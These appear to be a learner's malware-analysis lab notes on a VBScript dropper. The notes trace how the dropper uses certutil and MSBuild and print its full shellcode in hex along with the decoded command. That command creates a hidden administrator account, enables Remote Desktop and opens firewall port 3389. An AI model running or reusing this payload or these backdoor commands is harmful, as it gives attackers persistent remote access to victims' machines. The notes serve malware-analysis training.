Sample for this section:
`PMAT-labs/labs/3-3.OffScript-ScriptMalware/VBScript/Dropper.VBScript.vbs.malz.7z

## Dropper Code Analysis
We have tree files.
- `crtupdate.vbs`: Is the dropper write in VBS script.
- `one.crt`
- `two.crt`
![[Pasted image 20250128195602.png]]

Analyzing the code of the vbs script we can notice the code create a `WScript.Shell `object and  use this object to execute shell command.

Script steps:
- use **certutil** decode the `one.crt` file and save the result in `C:\Users\Public\Documents\one.vbs`
- use **certutil** decode the `two.crt` file and save the result in `C:\Users\Public\Documents\xml.xml
- Execute `one.vbs` file.
![[Pasted image 20250128195548.png]]


## Analysis of One.VBS code and MSBuild

Running the dropper this create to file under `C:\Users\Public\Documents`
folder

![[Pasted image 20250128202601.png]]

#### One.vbs
![[Pasted image 20250128202702.png]]
There is a stupid obfuscation created with `vVv` string. 
This is the clean code.
![[Pasted image 20250128202804.png]]
As you can see the code use `GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")`.

- `GetObject`: is used to obtain a new or existing `Component Object Model (COM)` object.

- `C08AFD90-F2A1-11D1-8455-00A0C91F3880`: is a `Class Identifier (CLSID)` of COM object, in this case refer to the `Shell.Application` object.
- `runas`: This parameter indicates that shell will open as administrator privilege 

>COM is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents) and ActiveX (Internet-enabled components) technologies. [more info here](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal)

So the malware execute this in a administrator shell.

```bash
PS C:\Users\BusySec > C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\users\Public\Documents\xml.xml
```

The `MSBuild` is the build platform for Microsoft and Visual Studio.

#### xml.xml
The `xml.xml` file contains this source code

![[Pasted image 20250128204348.png]]


Thake the payload hex remove the `0x` and `,` and save it a .bin file. 
```hex
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5636d642e657865202f6b20226e6574206c6f63616c67726f7570202252656d6f7465204465736b746f7020557365727322202f6164642026206e65742075736572202f6164642077647361646d696e2071717171313131312026206e6574206c6f63616c67726f75702061646d696e6973747261746f72732077647361646d696e202f6164642026206e6574206c6f63616c67726f7570202252656d6f7465204465736b746f70205573657273222077647361646d696e202f616464202620726567206164642022484b45595f4c4f43414c5f4d414348494e455c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c2053657276657222202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f642030202f662026206e65747368206164766669726577616c6c206669726577616c6c206164642072756c65206e616d653d224f70656e2052656d6f7465204465736b746f70222070726f746f636f6c3d544350206469723d696e206c6f63616c706f72743d3333383920616374696f6e3d616c6c6f77220
```

Now how we learn int the [[Carving Shellcode scdbg]] section we can use `scdbg` to view what the payload actually do.

In this case this is a code of the payload
![[Pasted image 20250128205535.png]]

```bash
WinExec(cmd.exe /k "net localgroup "Remote Desktop Users" /add & net user /add wdsadmin qqqq1111 & net localgroup administrators wdsadmin /add & net localgroup "Remote Desktop Users" wdsadmin /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow"@)
GetVersion()
ExitProcess(0)
```

After execution infect the `wdsadmin` user is added to the net users and  created the new group `Remote Desktop Users`.
![[Pasted image 20250128210257.png]]

This user is added also in `Remote Desktop Users` and `administrators`  local groups.
![[Pasted image 20250128210836.png]]

after that the paylaoad execute this command to add key in register
```bash 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

- `reg add`: is the command to add or modify a key or a value in a system registry
- `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"`: Its the path of the key to modify 
- `/t fDenyTSConnections`: specify the name of the value to create. In this case  [`fDenyTSConnections`](https://learn.microsoft.com/en-us/visualstudio/msbuild/walkthrough-using-msbuild?view=vs-2022) this value control the DRP connection
	- `1`: Disable connections
	- `0`: Enable connections
- `/t REG_DWORD`: specify the type of the value. In this case is **REG_DWORD** a numeric 32 bit.
- `/d 0`: set the value of fDenyTSConnections to 0 in this case (Enable).
- `/f`: Force the operation  without authorization of current user.
![[Pasted image 20250128213436.png]]



Finally the command executed of payload is 
```bash
netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow)
```

This create a firewall rule "Open Remote Desktop" to **allow incoming TCP connection on 3389 port**

You can show your firewall rule with this command
```bash
netsh advfirewall firewall show rule "Open Remote Desktop"
```

![[Pasted image 20250128214733.png]]
